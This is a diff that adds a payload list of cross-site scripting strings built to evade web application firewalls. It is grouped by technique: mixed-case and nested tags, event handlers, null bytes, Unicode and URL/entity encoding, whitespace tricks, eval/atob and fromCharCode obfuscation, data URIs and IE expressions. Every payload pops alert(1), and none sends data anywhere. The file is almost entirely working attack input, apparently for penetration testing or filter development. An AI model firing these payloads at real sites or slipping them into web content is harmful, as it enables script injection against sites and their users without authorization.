@@ -1,0 +1,65 @@
+# WAF Bypass XSS Payloads
+# Techniques to evade Web Application Firewalls
+
+# Case variation
+<ScRiPt>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+<scRipt>alert(1)</scRipt>
+
+# Tag manipulation
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script >alert(1)</script >
+<script	>alert(1)</script>
+<script
+>alert(1)</script>
+<script/x>alert(1)</script>
+
+# Alternative event handlers
+<img src=1 oNeRrOr=alert(1)>
+<iMg src=x OnErRoR=alert(1)>
+<dETAILS open onToGGLE=alert(1)>
+
+# Null byte injection
+<scri\x00pt>alert(1)</scri\x00pt>
+<img src=x onerror\x00=alert(1)>
+
+# Comment injection
+<script>/**/alert(1)/**/</script>
+<!--><script>alert(1)</script>-->
+
+# Unicode tricks
+<script>alert\u0028\u0031\u0029</script>
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+# HTML5 specific
+<svg><script href=data:,alert(1)>
+<svg><script xlink:href=data:,alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+
+# Encoding bypass
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+# Whitespace bypass
+<svg/onload=alert(1)>
+<svg\x09onload=alert(1)>
+<svg\x0Aonload=alert(1)>
+<svg\x0Conload=alert(1)>
+<svg\x0Donload=alert(1)>
+
+# Filter evasion
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>[].constructor.constructor("alert(1)")()</script>
+<script>window['al'+'ert'](1)</script>
+
+# Data URI
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# Expression (IE)
+<div style="width:expression(alert(1))">
+<img style="xss:expr/**/ession(alert(1))">
